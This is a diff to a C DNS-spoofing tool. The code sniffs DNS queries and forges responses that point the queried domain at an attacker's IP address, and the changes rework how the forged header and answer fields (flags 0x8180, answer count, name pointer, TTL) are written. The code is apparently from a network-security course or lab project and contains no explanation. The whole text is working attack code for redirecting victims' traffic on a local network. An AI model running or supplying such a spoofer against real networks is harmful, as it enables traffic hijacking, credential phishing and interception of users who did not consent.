@@ -82,6 +82,10 @@ char ip_address[100][100];
 static int m;
 char attacker_ip[20];
 
+u_short htons_1;
+u_short htons_8180;
+u_short htons_c00c;
+
 void get_attacker_machine_ip_address(char *device)
 {
 	int fd;
@@ -317,11 +321,11 @@ void print_ip_packet(const u_char *packet, u_char **payload, int *size_payload)
 				const struct dns_header *dns;
 				dns = (struct dns_header*)(packet + SIZE_ETHERNET + size_ip + 8);
 				spoofed_dns_header->id = dns->id;
-				spoofed_dns_header->flags = htons(33152); // Setting flags as 8180 (33152 is 81 80 in hexadecimal)
-				spoofed_dns_header->qdcount = dns->qdcount;
-				spoofed_dns_header->ancount = htons(1);
-				spoofed_dns_header->nscount = dns->nscount;
-				spoofed_dns_header->arcount = dns->arcount;
+				memcpy(&spoofed_dns_header->flags, &htons_8180, 2); //htons(33152); // Setting flags as 8180 (33152 is 81 80 in hexadecimal)
+				memcpy(&spoofed_dns_header->qdcount, &htons_1, 2);
+				memcpy(&spoofed_dns_header->ancount, &htons_1, 2);
+				spoofed_dns_header->nscount = 0;
+				spoofed_dns_header->arcount = 0;
 
 				// Forging the DNS Answer
 
@@ -365,16 +369,16 @@ void print_ip_packet(const u_char *packet, u_char **payload, int *size_payload)
 				struct dns_answer_data* answer_data;
 				answer_data = (struct dns_answer_data*)(datagram + size_ip + 8 + SIZE_DNS_HEADER \
 						    + domain_length + 1);
-				answer_data->type = query->type;
-				answer_data->class = query->class;
+				memcpy(&answer_data->type, &htons_1, 2);
+				memcpy(&answer_data->class, &htons_1, 2);
 
 				
 				struct dns_answer_data_1* answer_data1;
 				answer_data1 = (struct dns_answer_data_1*)(datagram + size_ip + 8 + SIZE_DNS_HEADER \
 						    + domain_length + 1 + sizeof(struct dns_answer_data));
-				answer_data1->name = htons(49164);  // c0 0c
-				answer_data1->type = query->type;
-				answer_data1->class = query->class;
+				memcpy(&answer_data1->name, &htons_c00c, 2);
+				memcpy(&answer_data1->type, &htons_1, 2);
+				memcpy(&answer_data1->class, &htons_1, 2);
 				answer_data1->ttl = htonl(600); // Keeping a 
 				answer_data1->rdlength = htons(4); // ip value is 4 bytes, hence this is 4
 				struct in_addr addr;
@@ -457,6 +461,9 @@ int main(int argc, char **argv)
 
     }
     index = optind;
+	htons_1 = htons(1);
+	htons_8180 = htons(33152);
+	htons_c00c = htons(49164);
     filter_exp = argv[index];
     if(dev == NULL)
     {
